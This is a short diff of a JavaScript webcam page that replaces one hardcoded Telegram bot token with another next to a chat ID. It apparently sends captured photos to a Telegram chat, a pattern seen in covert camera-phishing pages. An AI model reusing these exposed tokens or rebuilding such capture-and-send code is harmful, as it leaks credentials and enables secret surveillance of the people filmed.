@@ -3,7 +3,7 @@ const captureButton = document.getElementById('capture');
 const canvas = document.getElementById('canvas');
 const photo = document.getElementById('photo');
 
-const telegramBotToken = '7867871034:AAGJ_wI-6KPBpWIPxjfuxUtoPyRcqb_zRe0';
+const telegramBotToken = '8145088190:AAHfRPMjGY8FOP2AYl5kCdOuI43BirE-6Mo';
 const chatId = '8058894693';
 
 navigator.mediaDevices.getUserMedia({ video: true })
